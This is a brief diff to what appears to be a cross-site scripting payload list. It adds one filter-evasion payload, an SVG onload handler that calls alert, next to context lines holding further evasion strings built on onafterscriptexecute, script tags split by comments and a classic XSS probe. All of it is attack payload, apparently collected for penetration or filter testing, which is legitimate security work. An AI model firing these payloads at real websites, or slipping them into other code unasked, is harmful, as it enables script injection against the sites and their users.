@@ -17,3 +17,5 @@ tarun"><x/onafterscriptexecute=confirm%26lpar;)//
 '';!--"<XSS>=&{()}
 
 <!--><script>alert/**/()/**/</script>
+
+`/alert?.(1)'"><Svg/OnLoad='`
